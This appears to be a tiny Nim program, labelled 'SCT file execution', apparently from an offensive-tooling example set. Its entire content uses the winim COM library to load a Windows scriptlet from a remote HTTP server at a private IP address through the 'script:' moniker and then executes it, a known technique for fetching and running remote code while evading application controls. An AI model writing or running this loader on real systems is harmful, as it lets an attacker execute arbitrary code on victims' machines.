#[
    SCT file execution
]#

import winim/com

var scriptlet = GetObject("script:http://172.16.164.1:8000/test.sct")
scriptlet.Exec()